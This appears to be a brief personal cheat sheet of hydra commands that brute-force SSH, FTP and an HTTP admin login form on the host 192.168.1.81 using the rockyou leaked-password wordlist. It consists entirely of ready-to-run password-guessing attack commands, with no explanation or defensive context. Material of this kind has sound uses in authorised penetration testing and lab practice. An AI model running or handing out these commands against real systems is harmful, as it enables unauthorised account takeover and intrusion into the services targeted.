SSH
```
hydra -l <usuario> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  ssh://192.168.1.81
```
FTP
```
hydra -l <usuario> -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  ftp://192.168.1.81
```
HTTP login
```
hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 192.168.1.81 http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:Incorrect"
```